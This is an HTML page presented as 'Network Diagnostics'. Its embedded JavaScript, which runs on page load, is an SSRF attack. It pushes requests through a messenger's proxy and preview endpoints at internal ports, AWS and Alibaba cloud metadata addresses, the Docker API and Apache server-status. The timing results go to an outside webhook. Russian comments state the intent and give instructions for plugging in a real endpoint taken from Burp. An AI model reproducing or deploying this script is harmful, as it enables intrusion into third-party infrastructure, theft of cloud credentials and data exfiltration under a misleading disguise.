<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Network Diagnostics</title>
</head>
<body>
    <h1>Проверка конфигурации сети...</h1>
    <div id="log"></div>

    <script>
        const webhook = "https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4";
        const internalPorts = [22, 80, 443, 3306, 6379, 8080, 9090];
        const targetIp = "127.0.0.1.nip.io";

        async function scanPorts() {
            for (let port of internalPorts) {
                const start = Date.now();
                
                try {
                    // Мы заставляем БРАУЗЕР отправить запрос на их сервер,
                    // который в свою очередь должен дернуть сам себя (SSRF)
                    // ВАЖНО: Тут должен быть эндпоинт мессенджера, который делает запрос.
                    // Например, если это превью, мы просто имитируем обращение к нему.
                    
                    const response = await fetch(`https://max.ru/proxy?url=http://${targetIp}:${port}`, {
                        mode: 'no-cors'
                    });
                    
                } catch (e) {
                    // Ошибка — это тоже результат
                }

                const duration = Date.now() - start;
                
                // Отправляем результат замера на твой бин
                fetch(`${webhook}?port=${port}&time=${duration}&status=scanned`);
                
                document.getElementById('log').innerHTML += `<p>Port ${port}: ${duration}ms</p>`;

                const sensitiveUrls = [
    "http://169.254.169.254.nip.io/latest/meta-data/", // AWS/OpenStack
    "http://100.100.100.200.nip.io/latest/meta-data/", // Alibaba
    "http://127.0.0.1.nip.io:2375/v1.24/containers/json", // Docker API
    "http://127.0.0.1.nip.io:80/server-status" // Apache Status
];

sensitiveUrls.forEach(async (url) => {
    const start = Date.now();
    try {
        // Заставляем их прокси-сервер дернуть эти URL
        // ЗАМЕНИ 'https://web.max.ru/api/preview?url=' на реальный URL из Burp
        await fetch(`https://web.max.ru/api/preview?url=${encodeURIComponent(url)}`, { mode: 'no-cors' });
        
        const duration = Date.now() - start;
        fetch(`https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4?target=${btoa(url)}&time=${duration}`);
    } catch(e) {}
});
            }
        }

        // Запускаем сканирование
        scanPorts();
    </script>
</body>
</html>
